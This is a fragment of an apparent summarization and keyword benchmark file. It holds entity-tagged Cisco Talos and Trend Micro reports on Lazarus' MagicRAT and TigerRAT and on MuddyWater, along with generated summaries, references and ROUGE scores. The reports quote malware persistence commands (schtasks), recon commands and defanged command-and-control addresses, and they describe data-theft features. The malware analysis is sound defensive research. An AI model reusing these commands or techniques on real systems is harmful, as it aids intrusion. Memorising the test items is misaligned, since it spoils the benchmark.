MagicRAT and another [ORG] RAT known as \" TigerRAT , \" disclosed and attributed to [ORG] Lazarus by [ORG] the [ORG] Korean [ORG] Internet [ORG] & [ORG] Security [ORG] Agency ( [ORG] KISA ) recently . TigerRAT has evolved over [DATE] the [DATE] past [DATE] year to include new functionalities that we illustrate in this blog . Executive [PERSON] SummaryCisco [PERSON] Talos has discovered a new remote access trojan ( RAT ) , which we are calling \" [PERSON] MagicRAT , \" that we are attributing with moderate to high confidence to the [ORG] Lazarus threat actor , a state - sponsored [ORG] APT attributed to [GPE] North [GPE] Korea by [ORG] the [ORG] U.S. [ORG] Cyber [ORG] Security [ORG] & [ORG] Infrastructure [ORG] Agency ( CISA ) . This new [ORG] RAT was found on victims that had been initially compromised through the exploitation of publicly exposed VMware1/12Horizon platforms . While being a relatively simple RAT capability - wise , it was built with recourse to [ORG] the [ORG] Qt [ORG] Framework , with the sole intent of making human analysis harder , and automated detection through machine learning and heuristics less likely . We have also found evidence to suggest that once [PERSON] MagicRAT is deployed on infected systems , it launches additional payloads such as custom - built port scanners . Additionally , we 've found that [PERSON] MagicRAT 's C2 infrastructure was also used to host newer variants of known [ORG] Lazarus implants such as TigerRAT.The discovery of [PERSON] MagicRAT in the wild is an indication of [ORG] Lazarus ' motivations to rapidly build new , bespoke malware to use along with their previously known malware such as TigerRAT to target organizations worldwide . Actor profileAttributionCisco [PERSON] Talos assesses with moderate to high confidence these attacks have been conducted by the [NORP] North [NORP] Korean state - sponsored threat actor [ORG] Lazarus [ORG] Group . This attribution is based on tactics , techniques and procedures ( TTPs ) , malware implants and infrastructure overlap with known [ORG] Lazarus campaigns.2/12We have observed overlaps in [CARDINAL] C2 servers serving [PERSON] MagicRAT and previously disclosed [ORG] Lazarus campaigns utilizing the Dtrack RAT family . Furthermore , [PERSON] Talos has also discovered [CARDINAL] C2 servers hosting and serving TigerRAT to existing [PERSON] MagicRAT infections . TigerRAT is a malware family attributed to the Lazarus APT groups by [ORG] the [ORG] Korean [ORG] Internet [ORG] & [ORG] Security [ORG] Agency ( KISA).In some infections , we observed the deployment of [PERSON] MagicRAT by the attackers for some time , followed by its removal and the subsequent download and execution of another custom - developed malware called \" VSingle , \" another implant disclosed and attributed to Lazarus by JPCERT.Technical analysisMagicRATMagicRAT is programmed in [LANGUAGE] C++ programming language and uses [PERSON] the [PERSON] Qt [PERSON] Framework by statically linking it to the [ORG] RAT on 32- and [CARDINAL] 64 - bit versions . [PERSON] The [PERSON] Qt [PERSON] Framework is a programming library for developing graphical user interfaces , of which this [ORG] RAT has none . [PERSON] Talos believes that the objective was to increase the complexity of the code , thus making human analysis harder . On the other hand , since there are very few examples ( if any ) of malware programmed with [PERSON] Qt [PERSON] Framework , this also makes machine learning and heuristic analysis detection less reliable . The [CARDINAL] 32 - bit version was compiled with [ORG] GCC v3.4 using mingw / cygwin for support on the [ORG] Microsoft [PRODUCT] Windows platform , the [CARDINAL] 64 - bit version , however , was compiled with [ORG] VisualC64 , version 7.14.The [ORG] RAT uses the [PRODUCT] Qt classes throughout its entire code . The configuration is dynamically stored in a [ORG] QSettings class eventually being saved to disk , a typical functionality provided by that class . The malware configuration ( containing author - defined [ORG] QSettings ) is stored in the file \" visual.1991- 06.com.microsoft_sd.kit \" in the path \" \\ProgramData\\WindowsSoftwareToolkit\"- names and paths obviously chosen to trick the victim into believing they were part of the operating system . The image below shows an example of a configuration file . During our analysis , we identified [CARDINAL] three sections in the configuration file:[os ] which contains the command and control ( C2 ) URLs . [ General ] which holds general information . [ company ] which holds data used in the communication with the C2.3/12All analyzed samples had [CARDINAL] three encoded [CARDINAL] C2 URLs that are used to register infections and then receive commands to execute on the infected endpoint . The URLs are stored in the configuration file with the keys \" windows \" , \" linux \" and \" mac . \" The values are prefixed with \" LR02DPt22R \" followed by the URL encoded in base64.Upon execution , [PERSON] MagicRAT achieves persistence for itself by executing a hardcoded command that creates scheduled tasks on the victim machine . [ORG] Commandschtasks /create /tn \" OneDrive AutoRemove \" /tr \" C:\\Windows\\System32\\cmd.exe /c del /f /q C:/TEMP/[MagicRAT_file_name].exe \" /sc [DATE] daily /st [TIME] 10:30:30 /ru SYSTEM schtasks /create /tn \" Microsoft\\Windows\\light Service Manager \" /tr C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM % HOME%/AppData / Roaming / Microsoft / Windows / Start Menu / Programs / Startup / OneNote.lnkIntentScheduled task starting at a specific time [ T1053/005 ] Scheduled task starting at a different time an path [ T1053/005 ] Link created on startup folder [ T1547/001]Upon achieving persistence , the [ORG] RAT contacts the C2.4/12During the initial stages of execution , [PERSON] MagicRAT will perform just enough system reconnaissance to identify the system and environment in which the attackers are operating . This is done by executing the commands whoami , systeminfo and ipconfig /all . The last command has its results returned via the upload of the file [PRODUCT] zero_dump.mix to the C2.MagicRAT is rather simple \u2014 it provides the operator with a remote shell on the victim 's system for arbitrary command execution , along with the ability to rename , move and delete files on the endpoint . The operator can determine the timing for the implant to sleep , change the [CARDINAL] C2 URLs and delete the implant from the infected system . We also discovered a new variant of [PERSON] MagicRAT in the wild generated in [DATE] April [DATE] 2022 . This sample now consisted of the ability to delete itself from the infected endpoint using a [ORG] BAT file . Additional malwareOne of the [CARDINAL] C2 servers used by the new [PRODUCT] MagicRAT sample , [CARDINAL] 64[.]188[.]27[.]73 , hosted [CARDINAL] two more distinct implants masquerading as [ORG] GIF URLs . Now , [PERSON] MagicRAT can make requests to its [CARDINAL] C2 and download a [ORG] GIF file , which is actually an executable . Lightweight port scannerOne of the [ORG] GIF files discovered on [FAC] the [FAC] MagicRAT [FAC] C2 is called \" pct.gif , \" which is an extremely simple port scanner , whose main code fits into the image below.5/12It takes [CARDINAL] three arguments : The [ORG] IP to connect to , followed by the port number and , finally , a value dictating whether the output of the port scan must be written to a log file on disk or the standard output . After a successful connection , the executable will either write the string \" Connection success ! \" to the standard output or to a log file called \" [ORG] Ahnupdate.log \" located in the current user 's temporary directory . TigerRATThe [ORDINAL] second implant hosted on [PERSON] MagicRAT 's C2 is a remote access trojan ( RAT ) known as TigerRAT . TigerRAT is an implant disclosed in [DATE] 2021 by [ORG] KISA and [ORG] KRCERT as part of \" Operation ByteTiger '' detailing TigerRAT and its downloader \" TigerDownloader . \"This implant consists of several RAT capabilities , ranging from arbitrary command execution to file management . Capabilities of the implant include : Gather system information : username , computer name , network interface info , system info including product and version . Run arbitrary commands on the endpoint : set / get [ORG] CWD , run command via cmd.exe6/12Implant capability to run arbitrary commands . [ORG] Screen capture . File Management : drive reconnaissance , enumerate / delete files , create and write to files , read files and upload contents to C2 , create processes , Self delete / uninstall from system . The latest TigerRAT versions included [CARDINAL] one new capability with indicators of a [ORDINAL] second capability set to be introduced soon . [CARDINAL] One of these capabilities is called \" [ORG] USB dump . \" The authors have also created skeleton code in preparation for implementing video capture from Web cameras , though it has n't been implemented yet . USB DumpThe USB Dump capability gives the attackers the ability to:7/12Enumerate files for path \" [WORK_OF_ART] LOCAL_APPDATA\\GDIFONTC \" . Delete files . Find files of specific extensions in a specified drive and folder : .docx , .hwp , .doc , .txt , .pdf , .zip , .zoo , .arc , .lzh , .arj , .gz , .tgz . Add these files to an existing archive - in preparation for exfiltration . This is the main functionality of this new capability . The image below shows the code used to check the file extensions . [ORG] Lazarus ' implants commonly stitch together functionalities , including occasionally removing and adding different functions , which is evident from the latest TigerRAT samples:8/12While Lazarus added a new capability ( [ORG] USB dumping and skeleton code for [GPE] Webcam capture ) they removed the port forwarding capability in the latest version . Older variants of TigerRAT ( seen in [DATE] 2020- [DATE] 2021 ) consisted of encrypted strings but the latest variant consists of strings in plaintext . CoverageWays our customers can detect and block this threat are listed below.9/12Cisco [PERSON] Secure [PERSON] Endpoint ( formerly [ORG] AMP for Endpoints ) is ideally suited to prevent the execution of the malware detailed in this post . [ORG] Try [ORG] Secure [ORG] Endpoint for free here . Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks . [PERSON] Cisco Secure Email ( formerly [ORG] Cisco [ORG] Email [ORG] Security ) can block malicious emails sent by threat actors as part of their campaign . You can try Secure Email for free here . Cisco Secure Firewall ( formerly Next - Generation [ORG] Firewall and Firepower NGFW ) appliances such as [ORG] Threat [ORG] Defense [ORG] Virtual , Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat . Cisco Secure Malware Analytics ( Threat Grid ) identifies malicious binaries and builds protection into all [ORG] Cisco [ORG] Secure products . [ORG] Umbrella , [GPE] Cisco 's secure internet gateway ( [ORG] SIG ) , blocks users from connecting to malicious domains , [ORG] IPs and URLs , whether users are on or off the corporate network . Sign up for a free trial of [ORG] Umbrella [ORG] here.10/12Cisco [ORG] Secure [ORG] Web [ORG] Appliance ( formerly Web Security Appliance ) automatically blocks potentially dangerous sites and tests suspicious sites before users access them . Additional protections with context to your specific environment and threat data are available from [ORG] the [ORG] Firewall [ORG] Management [ORG] Center . [PERSON] Cisco [PERSON] Duo provides multi - factor authentication for users to ensure only those authorized are accessing your network . Open - source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on [ORG] Snort.org . [ORG] Orbital [ORG] QueriesCisco [ORG] Secure [ORG] Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat . For specific OSqueries on this threat , click here . hxxp[://]gendoraduragonkgp126[.]com / board / index[.]php hxxp[://]64[.]188[.]27[.]73 / board / mfcom1.gif hxxp[://]64[.]188[.]27[.]73 / board / pct.gif hxxp[://]64[.]188[.]27[.]73 / board / logo_adm_org.gif hxxp[://]64[.]188[.]27[.]73 / board / [ORG] tour_upt.htmlIPs193[.]56[.]28[.]251 52[.]202[.]193[.]124 64[.]188[.]27[.]73 151[.]106[.]2[.]139 66[.]154[.]102[.]9112/12", "generated_text": "Cisco Talos; a new remote access trojan; RAT; MagicRAT; the Lazarus APT group; North Korea; VMWare Horizon platforms; links; TigerRAT; TigerRAT; victim networks; the malware; techniques; procedures; RAT capabilities; Qt Framework; human analysis; machine learning; the engine; commands; control; detection; a custom-developed malware; custom port scanners; additional payloads; custom port scanners; TigerRAT; TigerRAT; the experience; the success; new capabilities; the group; the past year; new functionality; this attack.", "ref_text": "<START-1>The blog post from Cisco Talos details their discovery of a new remote access trojan (RAT) called MagicRAT that they attribute to the North Korean state-sponsored cyber threat actor Lazarus Group. MagicRAT was found on victims initially compromised through exploits of publicly exposed VMware Horizon servers. It is programmed in C++ using the Qt Framework, likely to make analysis harder. It achieves persistence through scheduled tasks and contacts command and control servers for further instructions, allowing operators remote shell access and file management capabilities on infected machines. The operators can also use MagicRAT's infrastructure to deliver additional malware payloads, like a lightweight port scanner and updated versions of the Lazarus RAT called TigerRAT. TigerRAT has new capabilities like USB file dumping and skeleton code for webcam capture, though that code isn't implemented yet. Overlap between MagicRAT's infrastructure and previous Lazarus campaigns like Dtrack provides additional evidence for attribution to Lazarus. Cisco Talos assesses that the discovery of MagicRAT shows Lazarus' intent to rapidly develop bespoke malware alongside existing tools to target organizations globally. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5013623978201635, "gpt3/lexical/rouge_rouge2": 0.1589041095890411, "gpt3/lexical/rouge_rougeL": 0.2670299727520436, "gpt3/lexical/rouge_rougeLsum": 0.2670299727520436, "gpt3_generated_text": ["In a recent discovery by Cisco Talos, a new remote access trojan (RAT) named MagicRAT has been attributed to the Lazarus APT group, believed to be a North Korean state-sponsored actor. This RAT was deployed after exploiting vulnerabilities in VMWare Horizon platforms and has links to another RAT known as TigerRAT. While MagicRAT is relatively simple in terms of capabilities, it was built using the Qt Framework to make human analysis and automated detection more challenging. The malware has been observed launching additional payloads such as custom port scanners. The C2 infrastructure of MagicRAT has also been used to host newer variants of known Lazarus implants like TigerRAT. This discovery highlights Lazarus' motivation to rapidly develop new malware to target organizations worldwide. The attacks have been attributed to the Lazarus Group based on TTPs, malware implants, and infrastructure overlap with known Lazarus campaigns. The RAT is programmed in C++ and uses the Qt Framework to increase code complexity. The configuration is stored in a QSettings class and saved to disk, with three sections identified during analysis. Overall, MagicRAT showcases Lazarus' evolving capabilities and their ongoing threat to victim networks."]}, {"split_name": "test", "sample_id": "test_79", "prompt_text": "Extract the keywords: New findings on [ORG] MuddyWater 's old and recent activities We came across new campaigns that seem to bear the markings of [ORG] MuddyWater \u2013 a threat actor group with a history of targeting organizations in [LOC] Middle [LOC] Eastern and [NORP] Asian countries . The group used new tools and payloads in campaigns over [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , pointing to the continued work the group has put in since our last report on MuddyWater in [DATE] November [DATE] 2018 . Apart from discovering new campaigns related to [ORG] MuddyWater , we also uncovered crucial information related to the group \u2019s old and recent activities . These include findings on the threat actor group \u2019s connection to some [ORG] Android malware variants , its use of false flags to misattribute campaigns to certain countries , its infrastructure , and its target countries and industries . We will also share our independent findings regarding certain information about the threat actor group \u2019s operations , which was leaked on [ORG] Telegram in [DATE] April [DATE] 2019.1Threat actors found using [PRODUCT] POWERSTATS [PRODUCT] V3 \u2013 a multi- stage backdoor In [CARDINAL] one of the MuddyWater campaigns we spotted , we detected spear - phishing emails that the group sent to a university in [GPE] Jordan and the [NORP] Turkish government . In both cases , the threat actor group did not spoof the said legitimate entities \u2019 sender address to deceive email recipients , but instead used compromised legitimate accounts to trick users into installing malware . Figure [CARDINAL] 1 . Screenshot of a spear - phishing email spoofing a government office , dated [DATE] April [DATE] 8 , 2019.Figure 2 . Email headers showing the origin of the spear - phishing emailThe legitimate owners of the compromised email accounts were from the same countries the target entities are based . As of this writing , it \u2019s unclear how they were compromised , but it \u2019s possible that the group had used the [NORP] Gophish toolkit since they have already utilized it in an old campaign.2The threat actor group deployed a new multi - stage [ORG] PowerShell - based backdoor called [ORG] POWERSTATS v3 . The spear - phishing email that contains a document embedded with a malicious macro will drop a [ORG] VBE file encoded with [ORG] Microsoft [ORG] Script [ORG] Encoder . The [ORG] VBE file , which holds a base64 - encoded block of data containing obfuscated [ORG] PowerShell script , will then execute . This block of data will be decoded and saved to the % PUBLIC% directory under various names ending with image file extensions such as .jpeg and .png . The [ORG] PowerShell code will then use custom string obfuscation and lots of useless blocks of code to make it difficult to analyze . Figure [CARDINAL] 3 . Code snippet of obfuscated and useless codeThe final backdoor code will be shown after the deobfuscation of all strings and removal of all unnecessary code . But [ORDINAL] first , the backdoor will acquire the operating system ( OS ) information and save the result to a log file . Figure [CARDINAL] 4 . Code snippet of OS information collectionThis file will be uploaded later to the command and control ( [ORG] C&C ) server . Each victim machine will generate a random GUID number , which will be used for machine identification . Later on , the malware variant will start the endless loop , querying for the [ORG] GUID - named file in a certain folder on the [ORG] C&C server . If the file is found , it will be downloaded and executed using the [ORG] Powershell.exe process . The threat actor group can then proceed to a [ORDINAL] second stage attack by sending commands to a specific victim in an asynchronous way . In essence , they can download another backdoor payload from the [ORG] C&C server and install it on their targets ' systems . Figure [CARDINAL] 5 . The code in [EVENT] POWERSTATS v3 that downloads the [ORDINAL] second attack stage3We were able to look into an instance where the group proceeded to launch a [ORDINAL] second stage attack . In this scenario , another backdoor was downloaded . The backdoor supports the following commands:\uf0b7 Take screenshots [CARDINAL] \uf0b7 [ORG] Command execution via the cmd.exe binary \uf0b7If there \u2019s no keyword , the malware variant assumes that the input is [ORG] PowerShell code and executes it via the \u201c Invoke - Expression \u201d cmdletFigure [CARDINAL] 6 . The code in [EVENT] POWERSTATS v3 ( [ORDINAL] second stage ) that handles the screenshot commandThe [ORG] C&C communication is done using [ORG] PHP scripts with a hardcoded token and a set of backend functions , e.g. , sc ( screenshot ) , res ( result of executed command ) , reg ( register new victim ) , and [ORG] uDel ( self - delete after an error).Figure [CARDINAL] 7 . In an endless loop , the malware variant queries a given path on [ORG] C&C server , trying to download aGUID - named file with commands to execute.4Other MuddyWater campaigns that used different payloads and tools Since [DATE] 2018 , the threat actors behind [ORG] MuddyWater have been actively targeting victims using a variety of methods and techniques , and they seem to keep on adding more as they move forward with new campaigns . The abovementioned campaign that used [ORG] POWERSTATS v3 is not the only one we found using new tricks . We observed other campaigns with different delivery methods and dropped file types . Notably , these campaigns have also changed payloads and publicly available post - exploitation tools . Payload changesDiscovery dateMethod for droppingmalicious codeType of filesdroppedFinal payload2018 - 032018 - 112018 - [DATE] 112019 - 012019 - 012019 - 03MacrosSCT , [ORG] INF , [GPE] base52POWERSTATSencodedMacrosVBS , [ORG] JS , base52POWERSTATSMacrosMacrosMacrosMacrosencodedDLL , REGEXEINF , EXECLOUDSTATSSHARPSTATSDELPHSTATSBase64 encoded , [ORG] POWERSTATS v2BAT2019 - 04Template injectionDocument [GPE] withPOWERSTATS v1 or v22019 - 05MacrosmacrosVBEPOWERSTATS v3Table 1 . The evolution of [ORG] MuddyWater \u2019s delivery methods and payloads since 2018One of the said custom tools was [ORG] POWERSTATS , a [ORG] PowerShell - based backdoor that the group [ORDINAL] first used in [DATE] 2017 . Another one is [ORG] CLOUDSTATS , a [ORG] PowerShell - based backdoor that uses a cloud file hosting provider for its command and control ( [ORG] C&C ) communication . We discussed the use of [ORG] CLOUDSTATS in a previous report . In [DATE] January [DATE] 2019 , we discovered that the campaign started using [ORG] SHARPSTATS , a .NET - written backdoor that supports [ORG] DOWNLOAD , [ORG] UPLOAD , and [ORG] RUN functions . In [DATE] the [DATE] same [DATE] month , [GPE] DELPHSTATS emerged . This backdoor is written in the [LOC] Delphi programming language , and queries the [ORG] C&C server for a .dat file before executing it via the [ORG] Powershell.exe process . Similar to the [ORG] SHARPSTATS backdoor , [GPE] DELPHSTATS employs custom [ORG] PowerShell script with code similarities to the [CARDINAL] one embedded into the [ORG] SHARPSTATS backdoor . A campaign that dropped this variant was thoroughly discussed in this report.5Figure [CARDINAL] 8 . SHARPSTATS can be used to collect system information by dropping and executing a PowerShellscript . Figure [CARDINAL] 9 . The code in [GPE] DELPHSTATS that queries a certain directory on the [ORG] C&C server . It \u2019s where operatorsupload additional payload . In mid - March [DATE] 2019 , we came across [LOC] POWERSTATS [LOC] v2 , a heavily obfuscated backdoor . An earlier version of this backdoor decodes the initial encoded / compressed blocks of code . An improved version appeared later on , and we saw that it heavily uses format strings and redundant backtick characters . In the earlier version , function names were still somehow readable , but they were completely randomized in later versions.6Figure [CARDINAL] 10 . Obfuscated POWERSTATS v2After deobfuscation , the main backdoor loop queries different URLs for a \u201c Hello server \u201d message to obtain command and upload the result of the run command to the [ORG] C&C server . Figure [CARDINAL] 11 . Deobfuscated main loop of [ORG] POWERSTATS v27Use of different post - exploitation tools Since the emergence of [ORG] MuddyWater , we found that its operators used multiple open source post- exploitation tools , which they deployed after successfully compromising a target . Name of the post - exploitation toolProgramming language / InterpreterCrackMapExecChromeCookiesViewchrome - passwordsEmpireProjectFruityC2KoadicLaZagneMeterpreterMimikatzMZCookiesViewPowerSploitShootbackSmbmapPython , PyInstallerExecutable fileExecutable filePowerShell , PythonPowerShellJavaScriptPython , PyInstallerReflective loader , executable fileExecutable fileExecutable filePowerShellPython , PyInstallerPython , PyInstallerTable [CARDINAL] 2 . [ORG] Tools used by [ORG] MuddyWater campaigns over the yearsOne of the campaigns we uncovered notably delivered the [ORG] EmpireProject stager via a scheme that involves the use of template injection and the abuse of the [ORG] CVE-2017 - [DATE] 11882 vulnerability . If the email recipient clicks on a malicious document , a remote template is downloaded , which will trigger the exploitation of [ORG] CVE-2017 - [ORG] 11882 . This will then lead to the execution the [ORG] EmpireProject stager . Figure [CARDINAL] 12 . Clicking on the malicious document leads to the abuse of [ORG] CVE-2017 - [ORG] 11882 , and then the execution ofthe [ORG] EmpireProject stager . We also saw the [PERSON] LaZagne credential dumper being patched to drop and run [ORG] POWERSTATS in the main function.8Figure [CARDINAL] 13 . [GPE] LaZagne has been patched to drop and run [ORG] POWERSTATS in the main function . See addedintimoddumpers ( ) function . Note the typo in the function name ( using [ORG] INTI , not INIT).9Connections to [ORG] Android malware variants In addition to uncovering new campaigns , we were also able to find connections between [ORG] MuddyWater and [CARDINAL] four [ORG] Android malware variants that posed as legitimate applications . We were able to establish proof of connection through their shared infrastructure , e.g. , [ORG] IP addresses and [ORG] C&C servers , and the code similarities between some of the malware families . We [ORDINAL] first noticed the [ORDINAL] first Android malware variant ( AndroidOS_Mudwater . [ORG] HRX ) when we discovered that its [ORG] IP address and [ORG] C&C server , [CARDINAL] 78[.]129[.]139[.]131 , was used as the final [ORG] C&C server of a [ORG] MuddyWater campaign . In the said campaign , we saw victims receiving commands for downloading a [ORDINAL] second stage payload from the abovementioned [ORG] IP address . Apart from custom stealing capabilities , AndroidOS_Mudwater . [ORG] HRX has [CARDINAL] two other interesting features:\uf0b7 [ORG] Brute forces hardcoded [ORG] IP addresses ( with a list of usernames and passwords ) . [CARDINAL] \uf0b7 Spreads malicious apps by sending all contacts an SMS ( in [GPE] Turkish ) containing a link to themalicious APK . The link points to an APK in the directory tree of a legitimate website belonging to a non - profit research organization in [GPE] Turkey . Most likely , the organization \u2019s website was compromised , which is not surprising as its website was hosted on [ORG] WordPress , a platform [ORG] MuddyWater is fond of targeting . Figure [CARDINAL] 14 . List of commands supported by the newer version of the malicious [ORG] appWe found a connection between AndroidOS_Mudwater . [ORG] HRX and the [ORDINAL] second malware variant ( AndroidOS_HiddenApp . [ORG] SAB ) based on similarities in their code structure . The figure below shows these similarities.10Figure [CARDINAL] 15 . List of commands supported by the older version of the malicious appThe [ORDINAL] second malware variant is a custom stealer that implements features for stealing call logs , contacts , SMS messages , phone information , and screenshots . It posts all stolen data to a [ORG] Telegram channel . Like the previously mentioned variant , we found hints in the file that shows that it might be a test version . We then discovered shared signed certificates that connect AndroidOS_HiddenApp . SAB and the [ORDINAL] third malware variant ( AndroidOS_Androrat . AXM ) . Its [ORG] C&C server is a local [ORG] IP address , which led us to think that our detected sample is a test version . Meanwhile , we saw the connection of [PERSON] Droidjack RAT \u2014 the [ORDINAL] fourth malware variant ( AndroidOS_Androrat . AXMA ) \u2014 to MuddyWater in the domain name of the former \u2019s [ORG] C&C server ( googleads[.]hopto[.]org ) , which shares [ORG] C&C servers with some [GPE] DELPHSTATS samples that we analyzed . A [PERSON] Droidjack RAT variant is a remote access trojan that allows attackers to take full control of an [ORG] Android device when installed . Potential targets While we ca n\u2019t say for sure who or what entities the [CARDINAL] four [ORG] Android malware variants were specifically targeting , our analysis of the indicators of compromise ( IoCs ) provided us with clues on the targets ' locations . It likely targets users in [GPE] Turkey , because the campaign used a malicious app that was hosted in a compromised [NORP] Turkish website . The campaign also spread an SMS written in the [NORP] Turkish language to lure users into downloading a malicious app . [GPE] Pakistan could be another target location : Some target [ORG] IP addresses that were hardcoded in the brute force functions of some samples were traced back to [GPE] Pakistan . [GPE] Afghanistan is another potential target location as the file name of [CARDINAL] one of the malicious applications we analyzed was \u201c [ORG] AfghanistanElection.apk . \u201d11Use of false flag techniques Some of the tools used by [ORG] MuddyWater campaigns contained false flags , which are messages that threat actors add into their programs to misattribute the campaign to a specific country . This technique was discussed recently by other researchers . Here are some false flags we spotted : Figure [CARDINAL] 16 . Several older [ORG] POWERSTATS backdoors contained simplified [NORP] Chinese text like \u201c \uff0c , \u201d which translates to \u201c Unable to connect to the URL , please wait for the dragon . \u201cFigure [CARDINAL] 17 . The dragon reference also manifested in this dragon variable . Figure [CARDINAL] 18 . Some [FAC] PowerSTATS backdoors were compiled with the PS2EXE tool to .EXE files . These containedfalse flags , which are famous quotes of well - known people in [GPE] Israel . The translation of the [CARDINAL] two sets of text above are as follows : \u201d $ god = \" If the [NORP] Arabs put down their weapons [DATE] today , there will be no more violence If the Jews put down their arms [DATE] today , there will be no more [GPE] Israel \" and \u201c $ SKey = \" he will raise the people and confirm that his word and law are standing \" . Note that these variables were not used in the rest of the code.12Figure [CARDINAL] 19 . These false flags try to misattribute an attack to [GPE] Russia or a country that uses the [PERSON] Cyrillic alphabet . [NORP] Russian texts appeared in the metadata of some delivery documents and in a debug path of [CARDINAL] one [ORG] DLL library.13MuddyWater - related information leaked on [GPE] Telegram In [DATE] April , details related to the alleged operations of the threat actor group behind [ORG] MuddyWater were leaked on [GPE] Telegram . The leaks contained images of the group \u2019s [ORG] C&C backends , source code , and a list of past hacked victims . Our monitoring efforts uncovered evidence that communication transpired between some victims ( that were listed in the leak ) and a [ORG] C&C server known to be from MuddyWater . Independently , we also spotted [CARDINAL] two versions of the server backend , which contains code similar to the details leaked on [GPE] Telegram . The code is a simple script written in Python , and encapsulated with [PERSON] PyInstaller . It will read a configuration file to find which [ORG] IP address and port to listen to , and it will display some commands available to the operator . The script displays [CARDINAL] two different [ORG] ASCII art for [CARDINAL] two versions . Figure [CARDINAL] 20 . ASCII art for version [CARDINAL] 1.0.0 , compiled on [DATE] July [DATE] 31 , 2017Figure [CARDINAL] 21 . ASCII art for version [DATE] 1.0.1 , compiled on [DATE] September [DATE] 4 , 2018.Based on these findings , we speculate that the leaks were based on real data.14The leak also included information regarding a certain individual . While we can not confirm its veracity , we noticed that a document with MuddyWater code has been posted to [ORG] VirusTotal prior to the leak , and its filename is similar to the name of the individual mentioned in the leak.15Infrastructure and targets For the most part , the threat actor group used direct [ORG] IP addresses as [ORG] C&C servers and a few domain names ( dynamic or not ) . In [DATE] 2018 , the group mostly used compromised [ORG] WordPress websites as proxies to send commands that were forwarded to the final [ORG] C&C servers . Figure [CARDINAL] 22 . Communication flow between the operator and the victimWe noticed that the said [ORG] C&C servers were usually set up to listen to an uncommon port , and were shut down [TIME] a [TIME] few [TIME] hours [TIME] later . The next time the servers were up , they usually listened on a different port . As mentioned in our previous research , most targets were located in [LOC] Middle [LOC] Eastern and [NORP] Asian countries . Recently , we saw the group aiming for new targets in [LOC] Europe . The figure below shows the target countries of [ORG] MuddyWater campaigns . We included [GPE] the [GPE] United [GPE] States , and some [NORP] European countries , based on verified information from the leaks . Figure [CARDINAL] 23 . Countries that [ORG] MuddyWater has targetedMost victims were government entities , with the majority in the finance , education , foreign affairs , interior , defense , trade , and customs sectors . We also found many victims in the telecommunications industry such as telcos and web hosting providers.16Figure [CARDINAL] 24 . Industries that [ORG] MuddyWater has targeted17Conclusion Aside from the abovementioned findings , we also found [PERSON] Twitter and [PERSON] Github accounts that we believe are linked to MuddyWater . Researchers have made similar findings in the past . This discovery , as well as the exposure of their operations to the public due to the leak , shows that the threat actor group has poor operational security and lack diligence in covering their tracks . However , the group also appears to be agile . [DATE] One [DATE] week after we published our [DATE] November [DATE] 2018 report on their use of base52 encoding , we found out that they modified the alphabet from [CARDINAL] 52 characters to [CARDINAL] 40 , [DATE] 45 , and [DATE] 48 . In our opinion , this action is a result of our disclosure of their activities . While MuddyWater appears to have no access to zero - days and advanced malware variants , it still managed to be successful in compromising its targets over [DATE] the [DATE] last [DATE] two [DATE] years . This can be attributed to the continuous evolution of their schemes . Notably , the group \u2019s use of email as an infection vector seems to have worked for their campaigns . In this regard , apart from using smart email security solutions , organizations should inform their employees of includes / customize / main[.]phphxxp://googleads[.]hopto[.]org / data / ce28e899a8d3d00a.]dathxxp://ciscoupdate2019[.]gotdns[.]ch / users[.]php?hxxps://www[.]jsonstore[.]io/4de4d6d84d17638b3cd0 [CARDINAL] 3CJwS9gbtNM84GL_ajl_AD2EoEOHrmbpQ5qC9J7 GcSSZQ0JNBDnOulnMWgNy3FV2kcHRuM0u5NMo5Jv9Ks4zS5 - pLkiYs4me / hxxps://104[.]237[.]233[.]38:8080 / nud2WCL9WzTiAO MCuFMboA18GWsmrc8k6VqGrXXfqVghYktellhTS7_tg - D64spqdv4sOJ / hxxps://88[.]99[.]17[.]148:443/3g - g7DuFHLwC8gPwW3z9rgnS1Is8F83B-95PHYnVp - k9219KbHn-24IChwxSFR35a117i2Jz_OX9mUPAYRJw-3NhMBxUVDp4iMOkzt / hxxps://104[.]237[.]233[.]40:8443 / zi5w0iDM6aLEgcWDnumYywaHa33BIPzaylNUPU - ECcNCmfNNcxzv05flJoB3wvWqH6Uf01vI-1yKF96 / hxxps://78[.]129[.]139[.]134:8864 / lZkP68TtH_BpZGhmMwxNPwy0vjimgwDRfk01pV2Xu2FztbaevB-6RzBUPRietWtBcuxru7tTsF3rZGFPbepd294BP2MGd / Figure [CARDINAL] 32 . List of C&C servers25TREND [ORG] MICROTM [ORG] RESEARCHTrend [ORG] Micro , a global leader in cybersecurity , helps to make the world safe for exchanging digital information . [ORG] Trend [ORG] Micro [ORG] Research is powered by experts who are passionate about discovering new threats , sharing key insights , and supporting efforts to stop cybercriminals . Our global team helps identify [CARDINAL] millions of threats [DATE] daily , leads the industry in vulnerability disclosures , and publishes innovative research on new threats techniques . We continually work to anticipate new threats and deliver thought - provoking research.www.trendmicro.com26", "generated_text": "MuddyWater; Middle Eastern; Asian; organizations; the group; new tools; payloads; campaigns; April 2019; spear-phishing emails; POWERSTATS v3; PowerShell scripts; VBE; VBE; an OS; list; the attacker; the malware; Download; command; control; the attacker; a second stage attack; commands; the C&C server; the C&C server; a command; control; servers; the attackers; IP; a domain; domains; IP addresses; the group; new malware variants; the group; infrastructure; the campaign; Target; Middle Eastern; Asia; the group; infrastructure.", "ref_text": "<START-1>The PDF describes new findings on the threat actor group MuddyWater, which has been actively targeting organizations in Middle Eastern and Asian countries since at least 2017. The group continues to evolve its tactics, using new tools and payloads in 2019 campaigns. They have deployed various backdoors including POWERSTATS, CLOUDSTATS, SHARPSTATS, and DELPHSTATS. Some campaigns also used false flags to misattribute attacks to certain countries. Connections were found between MuddyWater and four Android malware variants, suggesting mobile users may also be targets. The malware has capabilities to steal data and spread itself via SMS. Potential target countries based on indicators include Turkey, Pakistan, and Afghanistan. In April 2019, details on MuddyWater's operations were leaked online. Trend Micro's monitoring revealed evidence corroborating some aspects of the leaks. The leaks contained images of the group's command and control infrastructure, source code, and past victim lists. 